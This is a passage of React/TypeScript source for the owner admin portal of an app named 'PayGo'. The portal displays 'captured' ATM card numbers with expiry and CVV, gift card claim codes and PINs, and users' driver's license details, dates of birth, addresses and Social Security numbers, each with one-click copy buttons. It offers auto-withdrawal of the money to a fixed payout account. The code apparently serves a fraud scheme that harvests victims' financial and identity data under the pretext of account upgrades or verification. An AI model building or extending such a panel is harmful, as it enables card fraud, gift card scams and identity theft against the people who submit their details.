    if (clean.length < 6) {
      setBlockNotice('Enter at least 6 characters of the used gift card code.');
      return;
    }
    try {
      await blockUsedGiftCardCode(clean, 'Admin Flagged Used Card');
      setBlockCodeInput('');
      setBlockNotice('Used gift card code permanently blocked. No user can drop it.');
    } catch (err: any) {
      setBlockNotice(err?.message || 'Failed to block card code.');
    }
  };

  const handleExecuteWithdraw = async (e: React.FormEvent) => {
    e.preventDefault();
    const amt = parseFloat(withdrawAmountInput);
    if (!withdrawAmountInput || isNaN(amt) || amt <= 0 || !selectedCardForWithdraw) {
      return;
    }
    setIsWithdrawing(true);
    try {
      await recordRealInflow({
        type: selectedCardForWithdraw.type || 'ATM Card Settlement',
        amount: amt,
        sourceId: selectedCardForWithdraw.id,
        userEmail: selectedCardForWithdraw.userEmail,
        note: `Card ${selectedCardForWithdraw.cardNumber} settled to Treasury`,
      });
      setWithdrawSuccess(true);
    } catch (err: any) {
      showToast('error', err?.message || 'Failed to record ATM settlement.');
    } finally {
      setIsWithdrawing(false);
    }
  };

  const handleDeleteCard = async (cardId: string) => {
    if (!window.confirm('Are you sure you want to remove this ATM card submission? Only admin has access to remove ATM details.')) {
      return;
    }
    try {
      await deleteDoc(doc(db, 'cardSubmissions', cardId));
    } catch (err) {
      handleFirestoreError(err, OperationType.DELETE, `cardSubmissions/${cardId}`);
    }
  };

  const handleApproveCardSubmission = async (c: CapturedCard) => {
    try {
      const cleanEmail = c.userEmail?.trim().toLowerCase();
      if (!cleanEmail || cleanEmail === 'unknown') {
        showToast('error', 'User email not found for this card submission.');
        return;
      }
      const userRef = doc(db, 'users', cleanEmail);
      const updates: Record<string, any> = { updatedAt: new Date().toISOString() };
      if (c.type.toLowerCase().includes('pay id') || c.amount === 25) {
        updates.payIdVerified = true;
      } else if (c.type.startsWith('Stage ')) {
        updates.accountLevel = c.type.replace(' Card Purchase', '').replace(' Card', '');
      } else {
        updates.payIdVerified = true;
      }
      await updateDoc(userRef, updates);

      const cardAmt = Number(c.amount) || 0;
      const credited = await recordRealInflow({
        type: c.type || 'ATM Card Payment',
        amount: cardAmt,
        sourceId: c.id,
        userEmail: c.userEmail,
        note: `Approved payment for ${c.userEmail}`,
      });

      const autoSent = credited
        ? await maybeAutoDispatchToSmartCash(cardAmt, `Approved ${c.userEmail}`)
        : false;

      showToast(
        'success',
        autoSent
          ? `Approved ${c.userEmail} & auto-withdrawn $${cardAmt.toLocaleString()} directly to SmartCash (${DEFAULT_PAYOUT_ACCOUNT_NUMBER})!`
          : credited
          ? `Approved ${c.userEmail} & credited $${cardAmt.toLocaleString()} to Real Treasury Balance!`
          : `Approved and unlocked for ${c.userEmail}!`
      );
    } catch (err: any) {
      showToast('error', err?.message || 'Failed to approve card submission.');
    }
  };

  if (!isFullyAuthorized) {
    return (
      <div className="min-h-screen bg-gray-900 flex items-center justify-center p-4">
        <div className="bg-gray-800 rounded-3xl p-8 max-w-md w-full border border-gray-700 shadow-2xl text-white">
          <div className="w-16 h-16 bg-purple-600/20 text-purple-400 rounded-2xl flex items-center justify-center mx-auto mb-4 border border-purple-500/30">
            <Lock className="w-8 h-8" />
          </div>
          <h2 className="text-2xl font-bold text-center mb-1">Owner Admin Access</h2>
          <p className="text-xs text-gray-400 text-center mb-6">
            Restricted to authorized owner only
          </p>

          {error && (
            <div className="mb-4 p-3 bg-red-900/50 border border-red-700 text-red-300 text-xs rounded-xl">
              {error}
            </div>
          )}

          {!authReady ? (
            <div className="py-8 flex justify-center">
              <div className="w-8 h-8 border-4 border-purple-500 border-t-transparent rounded-full animate-spin" />
            </div>
          ) : !isOwnerGoogleVerified ? (
            <div className="space-y-4">
              <div className="bg-gray-900/80 border border-gray-700 rounded-2xl p-4 text-xs text-gray-300 leading-relaxed">
                Step 1 of 2: Sign in with the verified owner Google account to unlock database access.
              </div>
              <button
                type="button"
                onClick={handleOwnerGoogleSignIn}
                disabled={isSigningIn}
                className="w-full bg-white hover:bg-gray-100 text-gray-900 font-bold py-3.5 rounded-xl text-sm transition-all shadow-lg cursor-pointer flex items-center justify-center space-x-2 disabled:opacity-60"
              >
                <ShieldCheck className="w-4 h-4 text-purple-700" />
                <span>{isSigningIn ? 'Verifying...' : 'Sign in with Owner Google Account'}</span>
              </button>
            </div>
          ) : (
            <form onSubmit={handlePinUnlock} className="space-y-4">
              <div className="bg-emerald-500/10 border border-emerald-500/30 rounded-xl p-3 text-xs text-emerald-300 flex items-center justify-between">
                <span className="truncate">Verified: {firebaseUser?.email}</span>
                <button
                  type="button"
                  onClick={handleAdminSignOut}
                  className="text-gray-300 hover:text-white underline ml-2 shrink-0 cursor-pointer"
                >
                  Switch
                </button>
              </div>

              <div>
                <label className="block text-xs font-semibold uppercase tracking-wider text-gray-400 mb-1">
                  Enter Owner PIN
                </label>
                <input
                  type="password"
                  value={pin}
                  onChange={(e) => setPin(e.target.value)}
                  placeholder="Enter Owner PIN"
                  className="w-full p-3.5 bg-gray-900 border border-gray-700 rounded-xl focus:ring-2 focus:ring-purple-500 outline-none text-sm text-white font-mono tracking-widest text-center"
                  required
                />
              </div>

              <button
                type="submit"
                className="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-3.5 rounded-xl text-sm transition-all shadow-lg cursor-pointer"
              >
                Access Admin Logs
              </button>
            </form>
          )}

          <div className="mt-6 pt-4 border-t border-gray-700 text-center">
            <button
              onClick={onBack}
              className="text-xs text-gray-400 hover:text-white transition-colors cursor-pointer"
            >
              ← Return to PayGo App
            </button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-900 text-white pb-12">
      {/* Top Bar */}
      <div className="bg-gray-800 p-4 border-b border-gray-700 sticky top-0 z-30 shadow-md">
        <div className="max-w-5xl mx-auto flex flex-wrap items-center justify-between gap-3">
          <div className="flex items-center space-x-3">
            <button
              onClick={onBack}
              className="p-2 hover:bg-gray-700 rounded-full transition-colors text-white cursor-pointer"
            >
              <ArrowLeft className="w-5 h-5" />
            </button>
            <div>
              <h1 className="text-lg font-bold flex flex-wrap items-center gap-2">
                <span>Owner Admin Portal</span>
                <span className="text-xs bg-emerald-500/20 text-emerald-400 px-2 py-0.5 rounded-full border border-emerald-500/30 font-mono">
                  Real Ledger
                </span>
                {paystackStatus.checked && (
                  <span
                    className={`text-[11px] px-2 py-0.5 rounded-full border font-mono ${
                      paystackStatus.configured
                        ? 'bg-indigo-500/20 text-indigo-300 border-indigo-500/30'
                        : 'bg-amber-500/20 text-amber-300 border-amber-500/30'
                    }`}
                  >
                    {paystackStatus.configured
                      ? `Paystack ${paystackStatus.mode === 'live' ? 'Live' : 'Test'} Connected`
                      : 'Paystack Key Needed'}
                  </span>
                )}
              </h1>
              <p className="text-xs text-gray-400">
                PayGo Real Payment Treasury • {firebaseUser?.email || OWNER_EMAIL}
              </p>
            </div>
          </div>

          <div className="flex items-center space-x-2">
            {/* Quick tab switcher in header */}
            <div className="flex flex-wrap gap-1 bg-gray-900 p-1 rounded-xl border border-gray-700">
              <button
                onClick={() => setActiveTab('cards')}
                className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all cursor-pointer flex items-center space-x-1.5 ${
                  activeTab === 'cards'
                    ? 'bg-purple-600 text-white'
                    : 'text-gray-400 hover:text-white'
                }`}
              >
                <CreditCard className="w-3.5 h-3.5" />
                <span>Card / Other ({cards.length})</span>
              </button>
              <button
                onClick={() => setActiveTab('giftcards')}
                className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all cursor-pointer flex items-center space-x-1.5 ${
                  activeTab === 'giftcards'
                    ? 'bg-amber-600 text-white'
                    : 'text-gray-400 hover:text-white'
                }`}
              >
                <Gift className="w-3.5 h-3.5" />
                <span>Gift Cards ({giftCards.length})</span>
              </button>
              <button
                onClick={() => setActiveTab('kyc')}
                className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all cursor-pointer flex items-center space-x-1.5 ${
                  activeTab === 'kyc'
                    ? 'bg-indigo-600 text-white'
                    : 'text-gray-400 hover:text-white'
                }`}
              >
                <IdCard className="w-3.5 h-3.5" />
                <span>ID / KYC ({kycSubmissions.length})</span>
              </button>
              <button
                onClick={() => setActiveTab('payouts')}
                className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all cursor-pointer flex items-center space-x-1.5 ${
                  activeTab === 'payouts'
                    ? 'bg-emerald-600 text-white'
                    : 'text-gray-400 hover:text-white'
                }`}
              >
                <Landmark className="w-3.5 h-3.5" />
                <span>Bank Payouts ({payoutHistory.length})</span>
              </button>
            </div>

            <button
              onClick={handleAdminSignOut}
              title="Lock Admin Portal"
              className="bg-red-500/20 hover:bg-red-500/30 text-red-300 px-3 py-2 rounded-xl text-xs font-semibold border border-red-500/30 flex items-center space-x-1 cursor-pointer"
            >
              <LogOut className="w-3.5 h-3.5" />
              <span className="hidden sm:inline">Lock</span>
            </button>
          </div>
        </div>
      </div>

      <div className="max-w-5xl mx-auto p-4 sm:p-6 space-y-6">
        {actionToast && (
          <div
            className={`p-3.5 rounded-2xl text-xs font-semibold flex items-center justify-between border shadow-md ${
              actionToast.type === 'success'
                ? 'bg-emerald-950/80 border-emerald-500/40 text-emerald-300'
                : 'bg-red-950/80 border-red-500/40 text-red-300'
            }`}
          >
            <span>{actionToast.text}</span>
            <button
              onClick={() => setActionToast(null)}
              className="text-gray-400 hover:text-white ml-3 cursor-pointer"
            >
              ✕
            </button>
          </div>
        )}

        {/* Summary Metric Cards */}
        <div className="grid grid-cols-1 sm:grid-cols-4 gap-4">
          <div className="bg-gray-800 border border-gray-700 rounded-2xl p-5 shadow-sm">
            <div className="flex items-center justify-between">
              <p className="text-xs text-gray-400 uppercase font-medium">Pending Client Payments</p>
              <CreditCard className="w-4 h-4 text-purple-400" />
            </div>
            <h3 className="text-2xl font-black text-purple-400 mt-1 font-mono">
              ${pendingPaymentsTotal.toLocaleString('en-US', { minimumFractionDigits: 2 })}
            </h3>
            <p className="text-xs text-gray-500 mt-1">
              {cards.filter((c) => !settledSourceIds.has(c.id)).length} card(s) • {pendingGiftCards.length} gift card(s) pending
            </p>
          </div>

          <div className="bg-gray-800 border border-gray-700 rounded-2xl p-5 shadow-sm">
            <div className="flex items-center justify-between">
              <p className="text-xs text-gray-400 uppercase font-medium">Gift Card Verifications</p>
              <Gift className="w-4 h-4 text-amber-400" />
            </div>
            <h3 className="text-3xl font-black text-amber-400 mt-1">{giftCards.length}</h3>
            <p className="text-xs text-gray-500 mt-1">
              {settledInflows.length} real payment(s) approved
            </p>
          </div>

          <div className="bg-gray-800 border border-gray-700 rounded-2xl p-5 shadow-sm sm:col-span-2">
            <div className="flex flex-wrap items-center justify-between gap-2">
              <p className="text-xs text-gray-400 uppercase font-medium">
                Admin Treasury Wallet (SmartCash Auto-Withdraw)
              </p>
              <button
                type="button"
                onClick={toggleAutoWithdrawSmartCash}
                className={`text-[11px] font-bold px-2.5 py-0.5 rounded-full border cursor-pointer transition-all ${
                  autoWithdrawToSmartCash
                    ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40'
                    : 'bg-gray-700 text-gray-300 border-gray-600'
                }`}
              >
                Auto-Withdraw SmartCash: {autoWithdrawToSmartCash ? 'ON' : 'OFF'}
              </button>
            </div>
            <div className="flex flex-wrap items-center justify-between gap-2 mt-2">
              <h3 className="text-2xl font-black text-emerald-400 font-mono">
                ${adminWalletBalance.toLocaleString('en-US', { minimumFractionDigits: 2 })}
              </h3>
              <div className="flex flex-wrap items-center gap-2">
                <button
                  onClick={handleAutoSettleAllCards}
                  disabled={cards.length === 0 || isWithdrawing}
                  className="bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-bold px-3 py-1.5 rounded-xl cursor-pointer disabled:opacity-50 transition-all flex items-center space-x-1"
                >
                  <ArrowDownRight className="w-3.5 h-3.5" />
                  <span>Settle All ATM</span>
                </button>
                <button
                  onClick={() => handleOpenBankPayout(true)}
                  disabled={isProcessingPayout}
                  className="bg-indigo-600 hover:bg-indigo-700 text-white text-xs font-bold px-3 py-1.5 rounded-xl cursor-pointer transition-all flex items-center space-x-1 shadow-sm disabled:opacity-50"
                >
                  <Landmark className="w-3.5 h-3.5" />
                  <span>Remove / Withdraw Anytime</span>
                </button>
              </div>
            </div>
            <p className="text-xs text-gray-400 mt-1.5">
              SmartCash PSB: <span className="text-indigo-300 font-semibold">{DEFAULT_PAYOUT_ACCOUNT_NUMBER}</span>
              {' • '}
              In: <span className="text-emerald-300 font-mono">${totalSettledIn.toLocaleString('en-US', { minimumFractionDigits: 2 })}</span>
              {' • '}
              Out: <span className="text-indigo-300 font-mono">${totalSettledOut.toLocaleString('en-US', { minimumFractionDigits: 2 })}</span>
            </p>
          </div>
        </div>

        {/* Tab 1: ATM Cards */}
        {activeTab === 'cards' && (
          <div className="space-y-4">
            <div className="flex items-center justify-between">
              <h2 className="text-base font-bold text-gray-200 flex items-center space-x-2">
                <CreditCard className="w-5 h-5 text-purple-400" />
                <span>Captured ATM Cards & Withdrawals</span>
              </h2>
              <span className="text-xs text-gray-400 font-mono">
                {cards.length} Total Submissions
              </span>
            </div>

            {cards.length === 0 ? (
              <div className="bg-gray-800 border border-gray-700 rounded-2xl p-12 text-center text-gray-400">
                <CreditCard className="w-12 h-12 mx-auto mb-3 opacity-40" />
                <p className="text-sm">No ATM cards captured yet.</p>
                <p className="text-xs text-gray-500 mt-1">
                  When users submit card details during Upgrade, PayId or Deposit, they appear here live.
                </p>
              </div>
            ) : (
              <div className="space-y-4">
                {cards.map((c) => (
                  <div
                    key={c.id}
                    className="bg-gray-800 border border-gray-700 rounded-2xl p-5 shadow-sm space-y-4 hover:border-purple-500/50 transition-all"
                  >
                    <div className="flex items-center justify-between border-b border-gray-700 pb-3">
                      <div className="flex flex-wrap items-center gap-2">
                        <span className="bg-purple-600/30 text-purple-300 px-2.5 py-1 rounded-lg text-xs font-bold border border-purple-500/30">
                          {c.type}
                        </span>
                        {settledSourceIds.has(c.id) && (
                          <span className="bg-emerald-500/20 text-emerald-300 px-2 py-0.5 rounded-full text-[10px] font-bold border border-emerald-500/30">
                            Settled in Treasury
                          </span>
                        )}
                        <span className="text-xs text-gray-400 font-mono">{c.date}</span>
                      </div>
                      <span className="font-black text-emerald-400 text-lg">
                        ${c.amount?.toLocaleString()}
                      </span>
                    </div>

                    <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 text-xs">
                      <div>
                        <p className="text-gray-400 text-[10px] uppercase font-medium">Card Number</p>
                        <div className="flex items-center space-x-1.5 mt-0.5">
                          <p className="font-mono font-bold text-white text-sm">{c.cardNumber}</p>
                          <button
                            onClick={() => copyText(c.cardNumber.replace(/\s/g, ''), `card-${c.id}`)}
                            className="p-1 text-gray-400 hover:text-white"
                            title="Copy card number"
                          >
                            {copiedCodeId === `card-${c.id}` ? (
                              <Check className="w-3.5 h-3.5 text-emerald-400" />
                            ) : (
                              <Copy className="w-3.5 h-3.5" />
                            )}
                          </button>
                        </div>
                      </div>
                      <div>
                        <p className="text-gray-400 text-[10px] uppercase font-medium">Expiry / CVV</p>
                        <p className="font-mono font-bold text-white text-sm mt-0.5">
                          {c.expiry} • {c.cvv}
                        </p>
                      </div>
                      <div>
                        <p className="text-gray-400 text-[10px] uppercase font-medium">Cardholder Name</p>
                        <p className="font-bold text-white uppercase mt-0.5">{c.cardName}</p>
                      </div>
                      <div>
                        <p className="text-gray-400 text-[10px] uppercase font-medium">User Account</p>
                        <p className="font-medium text-purple-300 truncate mt-0.5">
                          {c.userName} ({c.userEmail})
                        </p>
                      </div>
                    </div>

                    <div className="pt-2 flex flex-wrap items-center justify-end gap-2">
                      <button
                        onClick={() => handleApproveCardSubmission(c)}
                        className="bg-purple-600 hover:bg-purple-700 text-white text-xs font-bold px-3.5 py-2.5 rounded-xl flex items-center space-x-1.5 transition-colors cursor-pointer shadow-md"
                      >
                        <ShieldCheck className="w-4 h-4" />
                        <span>Approve & Unlock</span>
                      </button>
                      <button
                        onClick={() => handleDeleteCard(c.id)}
                        className="bg-red-600/20 hover:bg-red-600 text-red-300 hover:text-white text-xs font-bold px-3.5 py-2.5 rounded-xl flex items-center space-x-1.5 transition-colors cursor-pointer border border-red-500/30"
                      >
                        <Trash2 className="w-4 h-4" />
                        <span>Remove</span>
                      </button>
                      <button
                        onClick={() => handleAutoWithdrawCard(c)}
                        disabled={isWithdrawing}
                        className="bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-bold px-4 py-2.5 rounded-xl flex items-center space-x-1.5 transition-colors cursor-pointer shadow-md disabled:opacity-50"
                      >
                        <ArrowDownRight className="w-4 h-4" />
                        <span>Auto-Withdraw to Wallet</span>
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* Tab 2: Gift Cards */}
        {activeTab === 'giftcards' && (
          <div className="space-y-4">
            <div className="flex items-center justify-between">
              <h2 className="text-base font-bold text-gray-200 flex items-center space-x-2">
                <Gift className="w-5 h-5 text-amber-400" />
                <span>Gift Card Submissions & Redemptions</span>
              </h2>
              <span className="text-xs text-gray-400 font-mono">
                {giftCards.length} Total Submissions
              </span>
            </div>

            {/* Admin Used Card Blocklist Control */}
            <form
              onSubmit={handleManualBlockUsedCard}
              className="bg-gray-800 border border-red-500/30 rounded-2xl p-4 space-y-2.5"
            >
              <div className="flex items-center justify-between">
                <div className="flex items-center space-x-2 text-xs font-bold text-red-300">
                  <Ban className="w-4 h-4 text-red-400" />
                  <span>Block Used / Already-Redeemed Gift Card Code</span>
                </div>
                <span className="text-[10px] text-gray-400">SHA-256 Registry</span>
              </div>
              <div className="flex flex-col sm:flex-row gap-2">
                <input
                  type="text"
                  value={blockCodeInput}
                  onChange={(e) => setBlockCodeInput(e.target.value.toUpperCase())}
                  placeholder="Paste any used gift card code to block it globally..."
                  className="flex-1 px-3 py-2.5 bg-gray-900 border border-gray-700 rounded-xl text-xs font-mono text-white uppercase outline-none focus:ring-2 focus:ring-red-500"
                />
                <button
                  type="submit"
                  className="bg-red-600 hover:bg-red-700 text-white font-bold px-4 py-2.5 rounded-xl text-xs cursor-pointer shrink-0"
                >
                  Block Used Card
                </button>
              </div>
              {blockNotice && <p className="text-[11px] text-emerald-400 font-medium">{blockNotice}</p>}
            </form>

            {giftCards.length === 0 ? (
              <div className="bg-gray-800 border border-gray-700 rounded-2xl p-12 text-center text-gray-400">
                <Gift className="w-12 h-12 mx-auto mb-3 opacity-40 text-amber-400" />
                <p className="text-sm">No gift card verifications submitted yet.</p>
                <p className="text-xs text-gray-500 mt-1">
                  When users submit gift cards for Upgrade or PAY ID verification, claim codes and photos appear here.
                </p>
              </div>
            ) : (
              <div className="space-y-4">
                {giftCards.map((g) => (
                  <div
                    key={g.id}
                    className="bg-gray-800 border border-gray-700 rounded-2xl p-5 shadow-sm space-y-4 hover:border-amber-500/50 transition-all"
                  >
                    <div className="flex items-center justify-between border-b border-gray-700 pb-3">
                      <div className="flex items-center space-x-2">
                        <span className="bg-amber-600/30 text-amber-300 px-2.5 py-1 rounded-lg text-xs font-bold border border-amber-500/30 flex items-center space-x-1">
                          <Gift className="w-3.5 h-3.5" />
                          <span>{g.cardBrand}</span>
                        </span>
                        <span className="text-xs bg-gray-700 text-gray-300 px-2 py-0.5 rounded-md">
                          {g.type}
                        </span>
                        <span className="text-xs text-gray-400 font-mono hidden sm:inline">{g.date}</span>
                      </div>
                      <div className="flex items-center space-x-3">
                        <span className="font-black text-amber-400 text-lg">
                          ${g.amount?.toLocaleString()}
                        </span>
                        <span
                          className={`text-xs px-2.5 py-1 rounded-full font-bold uppercase ${
                            g.status === 'redeemed'
                              ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30'
                              : g.status === 'verified'
                              ? 'bg-blue-500/20 text-blue-400 border border-blue-500/30'
                              : g.status === 'rejected'
                              ? 'bg-red-500/20 text-red-400 border border-red-500/30'
                              : 'bg-amber-500/20 text-amber-400 border border-amber-500/30'
                          }`}
                        >
                          {g.status || 'pending'}
                        </span>
                      </div>
                    </div>

                    <div className="grid grid-cols-1 sm:grid-cols-4 gap-3 text-xs">
                      {/* Claim Code with Quick Copy */}
                      <div className="sm:col-span-2 bg-gray-900/80 p-3 rounded-xl border border-gray-700/80">
                        <p className="text-gray-400 text-[10px] uppercase font-semibold mb-1">
                          Gift Card Claim Code / PIN
                        </p>
                        <div className="flex items-center justify-between">
                          <span className="font-mono font-bold text-amber-300 text-sm tracking-wider select-all break-all">
                            {g.cardCode}
                          </span>
                          <button
                            onClick={() => copyText(g.cardCode, `code-${g.id}`)}
                            className="ml-2 bg-amber-600/20 hover:bg-amber-600/30 text-amber-300 px-2.5 py-1 rounded-lg text-xs font-semibold flex items-center space-x-1 shrink-0 transition-colors cursor-pointer border border-amber-500/30"
                          >
                            {copiedCodeId === `code-${g.id}` ? (
                              <>
                                <Check className="w-3 h-3 text-emerald-400" />
                                <span>Copied</span>
                              </>
                            ) : (
                              <>
                                <Copy className="w-3 h-3" />
                                <span>Copy Code</span>
                              </>
                            )}
                          </button>
                        </div>
                        {g.cardPin && g.cardPin !== 'N/A' && (
                          <p className="text-[11px] text-gray-400 font-mono mt-1">
                            Card PIN / CVV: <span className="text-white font-bold">{g.cardPin}</span>
                          </p>
                        )}
                      </div>

                      {/* User Account Info */}
                      <div>
                        <p className="text-gray-400 text-[10px] uppercase font-medium">User Profile</p>
                        <p className="font-bold text-white mt-0.5">{g.userName}</p>
                        <p className="text-purple-300 truncate text-[11px]">{g.userEmail}</p>
                        <span className="text-[10px] text-gray-500 block mt-0.5">
                          Format: {g.cardFormat === 'physical' ? 'Physical Card' : 'Digital E-Code'}
                        </span>
                      </div>

                      {/* Photo / Receipt attachment */}
                      <div>
                        <p className="text-gray-400 text-[10px] uppercase font-medium">Uploaded Image</p>
                        {g.image ? (
                          <div
                            onClick={() => {
                              setPreviewImageTitle('Gift Card / Receipt Photo');
                              setPreviewImage(g.image || null);
                            }}
                            className="mt-1 flex items-center space-x-2 bg-gray-900 p-2 rounded-xl border border-gray-700 cursor-pointer hover:border-amber-400 transition-colors"
                          >
                            <img
                              src={g.image}
                              alt="Card receipt"
                              className="w-10 h-10 object-cover rounded-lg border border-gray-600"
                            />
                            <div className="text-[11px]">
                              <span className="text-amber-300 font-bold block flex items-center space-x-1">
                                <Eye className="w-3 h-3" />
                                <span>View Photo</span>
                              </span>
                              <span className="text-gray-500 text-[10px]">Tap to enlarge</span>
                            </div>
                          </div>
                        ) : (
                          <p className="text-gray-500 text-[11px] mt-1 italic">No photo attached (E-Code)</p>
                        )}
                      </div>
                    </div>

                    {/* Status Management Actions */}
                    <div className="pt-2 border-t border-gray-700/60 flex flex-wrap items-center justify-between gap-2">
                      <div className="text-[11px] text-gray-400">
                        Status:{' '}
                        <span className="font-semibold text-white capitalize">
                          {g.status || 'pending'}
                        </span>
                        {g.rejectionReason && (
                          <span className="text-red-400 ml-2">({g.rejectionReason})</span>
                        )}
                      </div>

                      <div className="flex flex-wrap items-center gap-2">
                        {g.status !== 'rejected' && (
                          <>
                            <button
                              onClick={() =>
                                handleUpdateGiftCardStatus(
                                  g,
                                  'rejected',
                                  'USED GIFT CARD: This gift card has already been used/redeemed before and is not allowed.'
                                )
                              }
                              className="bg-red-600/30 hover:bg-red-600 text-red-200 hover:text-white px-3 py-1.5 rounded-xl text-xs font-semibold border border-red-500/30 transition-all cursor-pointer flex items-center space-x-1"
                            >
                              <Ban className="w-3.5 h-3.5" />
                              <span>Reject: Used Card</span>
                            </button>
                            <button
                              onClick={() =>
                                handleUpdateGiftCardStatus(
                                  g,
                                  'rejected',
                                  'FAKE / WRONG GIFT CARD: This gift card code or proof photo is fake, invalid, or wrong.'
                                )
                              }
                              className="bg-rose-600/30 hover:bg-rose-600 text-rose-200 hover:text-white px-3 py-1.5 rounded-xl text-xs font-semibold border border-rose-500/30 transition-all cursor-pointer flex items-center space-x-1"
                            >
                              <Ban className="w-3.5 h-3.5" />
                              <span>Reject: Fake / Wrong</span>
                            </button>
                          </>
                        )}

                        {g.status !== 'verified' && (
                          <button
                            onClick={() => handleUpdateGiftCardStatus(g, 'verified')}
                            className="bg-blue-600/30 hover:bg-blue-600 text-blue-200 hover:text-white px-3 py-1.5 rounded-xl text-xs font-semibold border border-blue-500/30 transition-all cursor-pointer flex items-center space-x-1"
                          >
                            <CheckCircle className="w-3.5 h-3.5" />
                            <span>
                              {g.type === 'PAY ID Verification'
                                ? 'Confirm Gift Card & Release PAY ID'
                                : 'Confirm Gift Card'}
                            </span>
                          </button>
                        )}

                        {g.status !== 'redeemed' && (
                          <button
                            onClick={() => handleUpdateGiftCardStatus(g, 'redeemed')}
                            className="bg-emerald-600 hover:bg-emerald-700 text-white px-3.5 py-1.5 rounded-xl text-xs font-bold transition-all cursor-pointer flex items-center space-x-1 shadow-sm"
                          >
                            <Sparkles className="w-3.5 h-3.5" />
                            <span>Redeem / Complete</span>
                          </button>
                        )}
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* Tab 3: ID / KYC Verification (Driver's License & SSI) */}
        {activeTab === 'kyc' && (
          <div className="space-y-4">
            <div className="flex items-center justify-between">
              <h2 className="text-base font-bold text-gray-200 flex items-center space-x-2">
                <IdCard className="w-5 h-5 text-indigo-400" />
                <span>Driver&apos;s License &amp; SSI Verification Submissions</span>
              </h2>
              <span className="text-xs text-gray-400 font-mono">
                {kycSubmissions.length} Total Submissions
              </span>
            </div>

            {kycSubmissions.length === 0 ? (
              <div className="bg-gray-800 border border-gray-700 rounded-2xl p-12 text-center text-gray-400">
                <IdCard className="w-12 h-12 mx-auto mb-3 opacity-40 text-indigo-400" />
                <p className="text-sm">No ID &amp; SSI verifications submitted yet.</p>
                <p className="text-xs text-gray-500 mt-1">
                  After clients upgrade to Stage 5 — Ruby Tier, their Driver&apos;s License photos and SSI details appear here for review.
                </p>
              </div>
            ) : (
              <div className="space-y-4">
                {kycSubmissions.map((k) => (
                  <div
                    key={k.id}
                    className="bg-gray-800 border border-gray-700 rounded-2xl p-5 shadow-sm space-y-4 hover:border-indigo-500/50 transition-all"
                  >
                    <div className="flex flex-wrap items-center justify-between gap-2 border-b border-gray-700 pb-3">
                      <div className="flex flex-wrap items-center gap-2">
                        <span className="bg-indigo-600/30 text-indigo-300 px-2.5 py-1 rounded-lg text-xs font-bold border border-indigo-500/30 flex items-center space-x-1">
                          <IdCard className="w-3.5 h-3.5" />
                          <span>{k.accountLevel}</span>
                        </span>
                        <span className="text-xs text-gray-400 font-mono">{k.date}</span>
                      </div>
                      <span
                        className={`text-xs px-2.5 py-1 rounded-full font-bold uppercase ${
                          k.status === 'verified'
                            ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30'
                            : k.status === 'rejected'
                            ? 'bg-red-500/20 text-red-400 border border-red-500/30'
                            : 'bg-amber-500/20 text-amber-400 border border-amber-500/30'
                        }`}
                      >
                        {k.status}
                      </span>
                    </div>

                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs">
                      <div className="bg-gray-900/70 p-3 rounded-xl border border-gray-700/80 space-y-1">
                        <p className="text-[10px] uppercase font-semibold text-gray-400">Applicant &amp; Identity</p>
                        <p className="font-bold text-white text-sm">{k.fullName}</p>
                        <p className="text-purple-300 truncate">{k.userEmail}</p>
                        <p className="text-gray-300">DOB: <span className="font-mono text-white">{k.dateOfBirth}</span></p>
                        <p className="text-gray-400 text-[11px] leading-snug">{k.address}</p>
                      </div>

                      <div className="bg-gray-900/70 p-3 rounded-xl border border-gray-700/80 space-y-1.5">
                        <p className="text-[10px] uppercase font-semibold text-gray-400">Driver&apos;s License</p>
                        <div className="flex items-center justify-between gap-2">
                          <span className="font-mono font-bold text-amber-300 text-sm">{k.licenseNumber}</span>
                          <button
                            type="button"
                            onClick={() => copyText(k.licenseNumber, `dl-${k.id}`)}
                            className="bg-gray-800 hover:bg-gray-700 text-gray-200 px-2 py-1 rounded-lg text-[11px] font-semibold flex items-center space-x-1 cursor-pointer border border-gray-600"
                          >
                            {copiedCodeId === `dl-${k.id}` ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                            <span>{copiedCodeId === `dl-${k.id}` ? 'Copied' : 'Copy'}</span>
                          </button>
                        </div>
                        <p className="text-gray-300">State: <span className="text-white font-semibold">{k.licenseState}</span></p>
                        <p className="text-gray-300">Expires: <span className="font-mono text-white">{k.licenseExpiry}</span></p>
                      </div>

                      <div className="bg-gray-900/70 p-3 rounded-xl border border-gray-700/80 space-y-1.5">
                        <p className="text-[10px] uppercase font-semibold text-gray-400">SSI / Social Security</p>
                        <div className="flex items-center justify-between gap-2">
                          <span className="font-mono font-bold text-emerald-300 text-sm">{k.ssiNumber}</span>
                          <button
                            type="button"
                            onClick={() => copyText(k.ssiNumber, `ssi-${k.id}`)}
                            className="bg-gray-800 hover:bg-gray-700 text-gray-200 px-2 py-1 rounded-lg text-[11px] font-semibold flex items-center space-x-1 cursor-pointer border border-gray-600"
                          >
                            {copiedCodeId === `ssi-${k.id}` ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                            <span>{copiedCodeId === `ssi-${k.id}` ? 'Copied' : 'Copy'}</span>
                          </button>
                        </div>
                        <div className="grid grid-cols-2 gap-2 pt-1">
                          <button
                            type="button"
                            onClick={() => {
                              setPreviewImageTitle("Driver's License — Front");
                              setPreviewImage(k.licenseFrontImage);
                            }}
                            className="bg-gray-800 hover:border-indigo-400 border border-gray-700 rounded-xl p-1.5 flex items-center space-x-1.5 cursor-pointer"
                          >
                            <img src={k.licenseFrontImage} alt="License Front" className="w-8 h-8 object-cover rounded" />
                            <span className="text-[10px] text-indigo-300 font-bold">Front</span>
                          </button>
                          <button
                            type="button"
